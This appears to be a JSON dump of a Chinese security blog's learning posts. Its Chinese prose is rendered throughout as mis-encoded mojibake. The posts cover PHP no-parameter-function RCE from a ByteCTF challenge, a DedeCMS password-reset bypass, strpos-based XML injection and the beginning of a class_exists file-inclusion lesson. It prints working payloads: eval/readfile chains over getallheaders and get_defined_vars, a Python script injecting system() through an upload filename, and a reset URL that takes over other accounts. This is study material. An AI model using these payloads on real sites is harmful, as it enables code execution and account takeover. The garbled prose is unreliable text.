ç”±preg_replace('/[a-z]+\\((?R)?\\)/'å¯çŸ¥ï¼Œè¿™é‡Œåªå…è®¸æ— å‚æ•°çš„å‡½æ•°ä¼ é€’è¿›æ¥ã€‚å¹¶ä¸”å‡½æ•°ååªèƒ½ä¸ºå­—æ¯ï¼Œä¸èƒ½åŒ…å«ä¸‹åˆ’çº¿ç­‰å…¶ä»–ç‰¹æ®Šå­—ç¬¦ã€‚ è¿‡æ»¤äº†å¾ˆå¤šçš„å…³é”®å­—ï¼šet|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å¿…é¡»æ˜¯ä¸€ä¸ªåªå«å­—æ¯å¹¶ä¸”æ²¡æœ‰å‚æ•°çš„å‡½æ•°çš„payload.åŒæ—¶å¯ä»¥æ³¨æ„åˆ°è¿™ä¸ªæ˜¯å¯ä»¥è¿›è¡Œä¸€ä¸ªå‡½æ•°çš„å¥—ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ„é€ å¤šä¸ªç©ºå‚æ•°çš„å‡½æ•°å»è¯»å–flagã€‚ é¦–å…ˆçœ‹scandir()å‡½æ•°ï¼š scandir('.')èƒ½å¤Ÿè¿”å›å½“å‰ç›®å½•çš„æ–‡ä»¶åˆ—è¡¨çš„æ•°ç»„ï¼Œé‚£ä¹ˆæ€ä¹ˆå–å‡ºæ–‡ä»¶åå’Œè¯»å–æ–‡ä»¶å‘¢ï¼Œå¯ä»¥ä½¿ç”¨end()å’Œreadfile()ï¼š ä½†æ˜¯è¿˜éœ€è¦æ„é€ å‡½æ•°scandir('.')ä¸­çš„å‚æ•°.ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªlocaleconv()å‡½æ•°ï¼š å…¶ä¸­æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯.ï¼Œè€Œä¸end()ç›¸åçš„å–ç¬¬ä¸€ä¸ªå…ƒç´ çš„å‡½æ•°æœ‰ï¼š å› ä¸ºè¿™é‡Œè¿˜è¿‡æ»¤enï¼Œæ‰€ä»¥å°±é€‰æ‹©äº†åè€…ã€‚é‚£ä¹ˆå°±å¯ä»¥æ„é€ å¦‚ä¸‹payloadå¯ä»¥è¯»å–åˆ°æ–‡ä»¶æœ¬åœ°æ–‡ä»¶ï¼š 1readfile(end(scandir(pos(localeconv())))) ä½†æ˜¯flagå¹¶ä¸åœ¨æœ¬æ–‡ä»¶å¤¹ä¸‹ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°æ”¹å˜å½“å‰ç›®å½•çš„å‡½æ•°ï¼šchdir() å‡½æ•°å¯ä»¥æ”¹å˜å½“å‰çš„ç›®å½•ï¼Œæ­¤å¤–è¿˜éœ€è¦å€ŸåŠ©next()å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ è¿™é‡Œå¯ä»¥è·å–åˆ°scandir()è¿”å›çš„..ã€‚ ä½†æ˜¯chdir()å‡½æ•°å¹¶ä¸ä¼šè¿”å›ä¸€ä¸ªç›®å½•åˆ—è¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ªBoolå€¼ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š ç¬¬ä¸€ç§åŠæ³•æ˜¯ä½¿ç”¨ifè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å½“è·³è½¬ç›®å½•æˆåŠŸæ—¶å€™å°±è¯»å–å½“å‰æ–‡ä»¶ã€‚æ„é€ å¦‚ä¸‹payloadï¼š 1if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv())))) ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨localtime()é…åˆchr è·å–.çš„payloadï¼šchr(pos(localtime())) å½“æ—¶é—´ä¸ºæŸä¸€åˆ†é’Ÿçš„46ç§’æ—¶ï¼Œpos(localtime())è¿”å›46ï¼Œè€Œä¸”46æ˜¯.çš„ASCIIç å€¼ï¼Œæ‰€ä»¥payloadå°±ä¼šè¿”å›.ã€‚ ä½†æ˜¯localtimeç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¥æ”¶ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨time()æ¥è§£å†³ã€‚time()ä¸ä¼šå—å‚æ•°çš„å½±å“å¹¶ä¸”ä¼šè¿”å›ä¸€ä¸ªæ—¶é—´æˆ³ã€‚ æ‰€ä»¥æˆ‘ä»¬çš„payloadå°±æ˜¯ï¼š 1readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))); å…¶ä¸­chdir(next(scandir(pos(localeconv()))))æ›´æ¢å½“å‰è·¯å¾„ï¼Œscandir(chr(pos(localtime(time))))åˆ—å‡ºæ›´æ”¹è·¯å¾„åçš„å½“å‰ç›®å½•ç»“æ„ã€‚ 0x04 æ— å‚æ•°å‡½æ•°å°ç»“ Skyå¸ˆå‚…çš„æ–‡ç« å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œå°±åšä¸€ä¸ªå°ç»“ã€‚ 12345&lt;?phpif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_POST[&#x27;code&#x27;])) &#123; eval($_POST[&#x27;code&#x27;]);&#125;?&gt; è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å’Œä¸Šé¢çš„åŒºåˆ«åœ¨äºè¿™é‡Œè¿˜å¯ä»¥è¿è¡Œå‡½æ•°åç§°åŒ…å«_ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚ getenv()è·å–ç¯å¢ƒå˜é‡ ç‰ˆæœ¬è¦æ±‚PHP &gt; 7.1 ä½¿ç”¨getenv()è·å–è¶…å…¨å±€å˜é‡çš„æ•°ç»„ï¼Œä½¿ç”¨array_randå’Œarray_flipçˆ†ç ´å‡ºæ‰€æœ‰çš„å…¨å±€å˜é‡ã€‚ getallheaders() 12getallheaders() è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯, æ˜¯ä¸‹é¢å‡½æ•°çš„åˆ«åapache_request_headers è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯ è¿™ä¸¤ä¸ªå‡½æ•°åªé€‚ç”¨äºapacheæœåŠ¡å™¨ æ·»åŠ ä¸€ä¸ªHeaderä¸ºca01h: phpinfo();,æ ¹æ®ä½ç½®é€‰æ‹©åˆé€‚çš„payloadï¼š æ·»åŠ åœ¨Headeråœ¨ç¬¬ä¸€ä¸ªï¼š payload: code=eval(pos(getallheaders())); (pos()å¯ä»¥æ¢ä¸ºcurrent(). å¦‚æœåœ¨ç¬¬äºŒä¸ªå¯ä»¥ä½¿ç”¨next()) æ·»åŠ åœ¨Headeråœ¨æœ€åä¸€ä¸ªï¼š payload: code=eval(end(getallheaders())); ä¸çŸ¥é“ä½ç½®ï¼š é…åˆarray_rand(), array_flip()æ„é€ payloadè¿›è¡Œçˆ†ç ´ï¼š payload: eval(array_rand(array_flip(getallheaders()))); get_defined_vars() 1get_defined_vars() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚ å’Œgetallheaders()åˆ©ç”¨ç±»ä¼¼ï¼Œä½†æ˜¯ä¸æ­¢apache, ngnixå’Œå…¶ä»–çš„ä¹Ÿå¯ä»¥ç”¨ å‡½æ•°è¿”å›çš„å†…å®¹ï¼š 12345678910111213141516array(4) &#123; [&quot;_GET&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_POST&quot;]&#x3D;&gt; array(1) &#123; [&quot;code&quot;]&#x3D;&gt; string(29) &quot;var_dump(get_defined_vars());&quot; &#125; [&quot;_COOKIE&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]&#x3D;&gt; array(0) &#123; &#125;&#125; åˆ©ç”¨$_GET urlï¼šhttp://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo(); postï¼šcode=eval(end(current(get_defined_vars()))); åˆ©ç”¨$_FILE 12345678910import requestsfiles = &#123; &quot;system(&#x27;ping 127.0.0.1&#x27;);&quot;: &quot;&quot;&#125;data = &#123;&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;&#125;r = requests.post(&#x27;http://127.0.0.1/ctf/boringcode/rce.php&#x27;, data=data, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;)) ç›´æ¥æŠŠpayloadæ”¾åœ¨æ–‡ä»¶åä¸Šï¼Œç„¶åç”¨ä¸¤æ¬¡poså®šä½è¿›è¡Œåˆ©ç”¨ã€‚ 0x05 æ€»ç»“ 123456789101112131415161718getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼pos() current() çš„åˆ«ånext() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚end() å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚array_flip() array_flip() å‡½æ•°ç”¨äºåè½¬&#x2F;äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²getenv() è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°) 0x06 Reference Topic URL ByteCTFä¸€é“é¢˜çš„åˆ†æä¸å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨ https://threezh1.com/2019/09/15/boringcode/#get-defined-vars-gt-RCE å¤ç°ByteCTF-boringcode https://www.plasf.cn/2019/10/07/ByteCTF-WEBå¤ç°/ PHP Parametric Function RCE https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#å‰è¨€ 0x07 Update 2020.06.19 å¦‚ä½•åˆ©ç”¨æ— å‚æ•°å‡½æ•°è·³è½¬åˆ°æ ¹ç›®å½•ï¼Œå‡è®¾å½“å‰ç›®å½•æ˜¯/var/www/htmlï¼š 1var_dump(scandir(dirname(dirname(dirname(getcwd()))))) 2020.06.22 array_flipå¯ä»¥æ›¿æ¢ä¸ºarray_reverse readfileå¯ä»¥æ›¿æ¢ä¸ºshow_source 2020.07.02 1readfile(array_rand(array_flip(scandir(current(localeconv()))))); 2020.07.13 https://app.yinxiang.com/fx/73cc8928-dad4-4f87-b4d6-0d1e29375ee0","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"æ— å‚æ•°å‡½æ•°åˆ©ç”¨","slug":"æ— å‚æ•°å‡½æ•°åˆ©ç”¨","permalink":"http://ca0y1h.top/tags/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHPä»£ç å®¡è®¡â€”â€”Day3","date":"2020-06-14T14:07:48.000Z","path":"code_audit/6.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day4/","text":"PHPä»£ç å®¡è®¡å­¦ä¹ Day4â€”â€”strposå‡½æ•°ç¼ºé™· 0x01 False Beard 123456789101112131415161718192021class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, &#x27;&lt;&#x27;) || !strpos($user, &#x27;&gt;&#x27;)) &amp;&amp; (!strpos($pass, &#x27;&lt;&#x27;) || !strpos($pass, &#x27;&gt;&#x27;)) ) &#123; $format = &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27; . &#x27;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#x27;; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST[&#x27;username&#x27;], $_POST[&#x27;password&#x27;]); è¿™æ®µç¨‹åºä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç”¨XMLç»“æ„å­˜å‚¨ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µå®¹æ˜“é€ æˆXMLæ³¨å…¥ã€‚ç¬¬8è¡Œå’Œç¬¬9è¡Œä½¿ç”¨äº†strposå‡½æ•°æ¥é˜²æ­¢ç”¨æˆ·è¾“å…¥çš„å‚æ•°åŒ…å«&lt;å’Œ &gt;è¿™ä¸ªä¸¤ä¸ªç¬¦å·ã€‚å…ˆæ¥çœ‹çœ‹strposå‡½æ•°çš„å®šä¹‰ï¼š åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œå¼€å‘è€…åªè€ƒè™‘åˆ° strpos å‡½æ•°è¿”å› false çš„æƒ…å†µï¼Œå´å¿½ç•¥äº†åŒ¹é…åˆ°çš„å­—ç¬¦åœ¨é¦–ä½æ—¶ä¼šè¿”å› 0 çš„æƒ…å†µï¼Œå› ä¸º false å’Œ 0 çš„å–åå‡ä¸º trueï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡é—­åˆ&quot;çš„æ–¹å¼æ¥æ³¨å…¥XMLã€‚Payloadå¦‚ä¸‹ï¼š 1username&#x3D;&quot;&#x2F;&gt;&lt;injected-tag%20property&#x3D;&quot;&amp;password&#x3D;&lt;injected-tag&gt; ä½†æ˜¯è¿™æ®µä»£ç SimpleXMLElementå¹¶æ²¡æœ‰æŒ‡å®šLIBXML_NOENTå‚æ•°ï¼Œä»è€Œä¸èƒ½è¯»å–å¤–éƒ¨å®ä½“ï¼Œä¸çŸ¥é“åœ¨è¿™ä¸ªåœ°æ–¹è¿™æ ·çš„XMLæ³¨å…¥èƒ½æœ‰ä»€ä¹ˆå±å®³ã€‚ 0x02 å®ä¾‹åˆ†æ æ¼æ´åˆ©ç”¨ é¦–å…ˆåœ¨åå°å¼€å¯ä¼šå‘˜åŠŸèƒ½ï¼š æ³¨å†Œä¸¤ä¸ªä¼šå‘˜ï¼Œå¹¶ä¸”ä¸èƒ½è®¾ç½®å¯†ä¿é—®é¢˜ï¼š åœ¨ç™»å½•è´¦å·test1çš„æƒ…å†µä¸‹è®¿é—®ä¸‹é¢é“¾æ¥ï¼š 1http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecmsmember&#x2F;resetpassword.php?dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;3 burpæŠ“åŒ…é‡æ”¾ï¼š ç„¶åå¸¦ç€idä¸keyè®¿é—®ï¼š 1http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go è‡ªåŠ¨å¡«å……äº†test2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®ã€‚ ä»£ç åˆ†æ æ ¹æ®æ¼æ´urlå®šä½åˆ°member\\resetpassword.phpçš„safequestionæ“ä½œï¼š 1234567891011121314151617181920else if($dopost == &quot;safequestion&quot;)&#123; $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id); $sql = &quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;$mid&#x27;&quot;; $row = $db-&gt;GetOne($sql); if(empty($safequestion)) $safequestion = &#x27;&#x27;; if(empty($safeanswer)) $safeanswer = &#x27;&#x27;; //$row[&#x27;safequestion&#x27;]:&quot;0&quot; $row[&#x27;safeanswer&#x27;]:&#x27;&#x27; if($row[&#x27;safequestion&#x27;] == $safequestion &amp;&amp; $row[&#x27;safeanswer&#x27;] == $safeanswer) &#123; sn($mid, $row[&#x27;userid&#x27;], $row[&#x27;email&#x27;], &#x27;N&#x27;); exit(); &#125; else &#123; ShowMsg(&quot;å¯¹ä¸èµ·ï¼Œæ‚¨çš„å®‰å…¨é—®é¢˜æˆ–ç­”æ¡ˆå›ç­”é”™è¯¯&quot;,&quot;-1&quot;); exit(); &#125;&#125; è¿™é‡Œå…ˆæ ¹æ®ä¼ å…¥çš„idå‚æ•°æŸ¥è¯¢å¯¹åº”ç”¨æˆ·çš„å¯†ä¿é—®é¢˜ç­”æ¡ˆ ã€useridã€ é‚®ç®±ç­‰ä¿¡æ¯,æ¥ç€ä¸‹é¢è¿›è¡Œåˆ¤æ–­,å¦‚æœä¼ å…¥çš„$safequestionä¸$safeansweréç©ºä¸”ä¸ä¹‹å‰è®¾ç½®çš„ç›¸ç­‰,å°±è¿›å…¥sn()å‡½æ•°æ“ä½œ å®ƒè¿™é‡Œç”¨çš„æ˜¯ == è€Œé === æ¥åˆ¤æ–­,æ‰€ä»¥è¿™é‡Œæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼š é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨safequestion=0.0&amp;safeanswer=å³å¯ä½¿$row['safequestion'] == $safequestion &amp;&amp; $row['safeanswer'] == $safeanswer)ä¸ºtrue,è¿›å…¥sn()å‡½æ•°ï¼š 1234567891011121314151617181920212223function sn($mid,$userid,$mailto, $send = &#x27;Y&#x27;)&#123; global $db; $tptim= (60*10); $dtime = time(); $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;$mid&#x27;&quot;; $row = $db-&gt;GetOne($sql); if(!is_array($row)) &#123; //å‘é€æ–°é‚®ä»¶ï¼› newmail($mid,$userid,$mailto,&#x27;INSERT&#x27;,$send); &#125; //10åˆ†é’Ÿåå¯ä»¥å†æ¬¡å‘é€æ–°éªŒè¯ç ï¼› elseif($dtime - $tptim &gt; $row[&#x27;mailtime&#x27;]) &#123; newmail($mid,$userid,$mailto,&#x27;UPDATE&#x27;,$send); &#125; //é‡æ–°å‘é€æ–°çš„éªŒè¯ç ç¡®è®¤é‚®ä»¶ï¼› else &#123; return ShowMsg(&#x27;å¯¹ä¸èµ·ï¼Œè¯·10åˆ†é’Ÿåå†é‡æ–°ç”³è¯·&#x27;, &#x27;login.php&#x27;); &#125;&#125; è¿™é‡Œä»£ç é€»è¾‘æ˜¯å…ˆæ ¹æ®idä»dede_pwd_tmpæ•°æ®è¡¨ä¸­åˆ¤æ–­æ˜¯å¦æœ‰å¯¹åº”çš„å¯†ç è®°å½•,è‹¥è´¦å·ä¸ºç¬¬ä¸€æ¬¡ä¿®æ”¹å¯†ç ,è¿™é‡Œçš„$rowå°±ä¼šç©º,è¿›å…¥newmail()å‡½æ•°,æ‰§è¡Œinsert()æ“ä½œï¼š 123456789101112131415161718192021222324#uploads\\member\\resetpassword.php 73è¡Œfunction newmail($mid, $userid, $mailto, $type, $send)&#123; ... $randval = random(8); ... if($type == &#x27;INSERT&#x27;) &#123; $key = md5($randval); $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#x27;$mid&#x27;, &#x27;$userid&#x27;, &#x27;$key&#x27;, &#x27;$mailtime&#x27;);&quot;; if($db-&gt;ExecuteNoneQuery($sql)) &#123; if($send == &#x27;Y&#x27;) &#123; ... &#125; else if ($send == &#x27;N&#x27;) &#123; return ShowMsg(&#x27;ç¨åè·³è½¬åˆ°ä¿®æ”¹é¡µ&#x27;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval); &#125; &#125; else &#123; &#125; &#125; å…ˆç”Ÿæˆä¸€ä¸ª8ä½çš„éšæœºå¯†ç å¹¶èµ‹å€¼ç»™$randval,ç„¶åå°†å…¶ç”¨md5åŠ å¯†,å­˜å‚¨åˆ°dede__pwd_tmpè¡¨ä¸­,æ¥ç€åˆ°äº†æ¼æ´çš„è§¦å‘ç‚¹,è¿›å…¥$send == 'N'çš„æ“ä½œ,å°†æœªç»md5åŠ å¯†çš„$randvalä¼ ç»™äº†ç”¨æˆ·ã€‚ é‚£ä¹ˆè¿™é‡Œæ‹¼æ¥çš„urlå°±ä¸ºï¼š 1http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go ç»§ç»­è·Ÿè¿›dopost=getpasswdçš„æ“ä½œï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556else if($dopost == &quot;getpasswd&quot;)&#123; //ä¿®æ”¹å¯†ç  if(empty($id)) &#123; ShowMsg(&quot;å¯¹ä¸èµ·ï¼Œè¯·ä¸è¦éæ³•æäº¤&quot;,&quot;login.php&quot;); exit(); &#125; $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id); $row = $db-&gt;GetOne(&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;$mid&#x27;&quot;); if(empty($row)) &#123; ShowMsg(&quot;å¯¹ä¸èµ·ï¼Œè¯·ä¸è¦éæ³•æäº¤&quot;,&quot;login.php&quot;); exit(); &#125; if(empty($setp)) &#123; $tptim= (60*60*24*3); $dtime = time(); if($dtime - $tptim &gt; $row[&#x27;mailtime&#x27;]) &#123; $db-&gt;executenonequery(&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;$id&#x27;;&quot;); ShowMsg(&quot;å¯¹ä¸èµ·ï¼Œä¸´æ—¶å¯†ç ä¿®æ”¹æœŸé™å·²è¿‡æœŸ&quot;,&quot;login.php&quot;); exit(); &#125; require_once(dirname(__FILE__).&quot;/templets/resetpassword2.htm&quot;); &#125; elseif($setp == 2) &#123; if(isset($key)) $pwdtmp = $key; $sn = md5(trim($pwdtmp)); if($row[&#x27;pwd&#x27;] == $sn) &#123; if($pwd != &quot;&quot;) &#123; if($pwd == $pwdok) &#123; $pwdok = md5($pwdok); $sql = &quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;$id&#x27;;&quot;; $db-&gt;executenonequery($sql); $sql = &quot;UPDATE `#@__member` SET `pwd` = &#x27;$pwdok&#x27; WHERE `mid` = &#x27;$id&#x27;;&quot;; if($db-&gt;executenonequery($sql)) &#123; showmsg(&#x27;æ›´æ”¹å¯†ç æˆåŠŸï¼Œè¯·ç‰¢è®°æ–°å¯†ç &#x27;, &#x27;login.php&#x27;); exit; &#125; &#125; &#125; showmsg(&#x27;å¯¹ä¸èµ·ï¼Œæ–°å¯†ç ä¸ºç©ºæˆ–å¡«å†™ä¸ä¸€è‡´&#x27;, &#x27;-1&#x27;); exit; &#125; showmsg(&#x27;å¯¹ä¸èµ·ï¼Œä¸´æ—¶å¯†ç é”™è¯¯&#x27;, &#x27;-1&#x27;); exit; &#125;&#125; è¿™é‡Œå…ˆåˆ¤æ–­idæ˜¯å¦æ‰§è¡Œè¿‡é‡ç½®å¯†ç çš„æ“ä½œå¦‚æœæ²¡æœ‰åˆ™é€€å‡ºï¼Œæ¥ç€è¿›å…¥äº†empty($setp)çš„æ“ä½œï¼Œåˆ¤æ–­æ˜¯å¦è¶…è¿‡ä¿®æ”¹æœŸé™ï¼Œæœ€ååŒ…å«äº†resetpassword2.htmï¼š é¡µé¢è®¾ç½®äº†setpä¸º2ï¼Œè¿›å…¥$setp == 2çš„æ“ä½œï¼Œè¿™é‡Œåˆ¤æ–­äº†$snä¸dede_pwd_tmpçš„pwdå€¼($key)æ˜¯å¦ç›¸ç­‰,å› ä¸º $sn=md5($randval)=$row['pwd']ï¼Œè¿™æ ·å°±å¯ä»¥é‡ç½®å¯†ç äº†ã€‚ 0x03 ç»ƒä¹ é¢˜ é¢˜ç›®é“¾æ¥: https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ å¯†ç : 59t2 è¿™é“é¢˜ä¹‹å‰åšè¿‡ï¼Œé—®é¢˜å‡ºç°åœ¨api.phpä¸­çš„buyå‡½æ•°ï¼š 123456789101112131415function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION[&#x27;money&#x27;]; $numbers = $req[&#x27;numbers&#x27;]; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; ......&#125; å…³é”®ç‚¹åœ¨ç¬¬10è¡Œä»£ç ï¼Œå®ƒä½¿ç”¨==è¿›è¡Œæ¯”è¾ƒï¼Œè€Œè¯­è¨€å®šä¹‰ï¼Œé™¤äº† 0ã€falseã€null ä»¥å¤–å‡ä¸º true ï¼Œæ‰€ä»¥ä½¿ç”¨ true å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œè¿”å›çš„å€¼è‚¯å®šæ˜¯ trueï¼Œæ‰€ä»¥æˆ‘ä»¬æŠ“åŒ…ä¿®æ”¹æ•°æ®æäº¤7ä¸ªtrueï¼Œå¦‚ä¸‹å›¾ï¼š","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day3","date":"2020-06-13T16:25:39.000Z","path":"code_audit/5.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day3/","text":"PHPä»£ç å®¡è®¡å­¦ä¹ Day3â€”â€”å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´ 0x01 Snow flake ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&#x27;c&#x27;];$data = $_GET[&#x27;d&#x27;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data); $controller-&gt;render();&#125; else &#123; echo &#x27;There is no page with this name&#x27;;&#125;class HomeController &#123; private $data; public function __construct($data) &#123; $this-&gt;data = $data; &#125; public function render() &#123; if ($this-&gt;data[&#x27;new&#x27;]) &#123; echo &#x27;controller rendering new response&#x27;; &#125; else &#123; echo &#x27;controller rendering old response&#x27;; &#125; &#125;&#125; class_exist()æ–‡ä»¶åŒ…å«æ¼æ´ é¦–å…ˆæ¥çœ‹class_exist()çš„å®šä¹‰ï¼š class_exists ï¼š(PHP 4, PHP 5, PHP 7) åŠŸèƒ½ ï¼šæ£€æŸ¥ç±»æ˜¯å¦å·²å®šä¹‰ å®šä¹‰ ï¼š bool class_exists ( string $class_name[, bool $autoload = true ] ) $class_name ä¸ºç±»çš„åå­—ï¼Œåœ¨åŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™ã€‚é»˜è®¤æƒ…å†µä¸‹ $autoload ä¸º true ï¼Œå½“ $autoload ä¸º true æ—¶ï¼Œä¼šè‡ªåŠ¨åŠ è½½æœ¬ç¨‹åºä¸­çš„ __autoload å‡½æ•°ï¼›å½“ $autoload ä¸º false 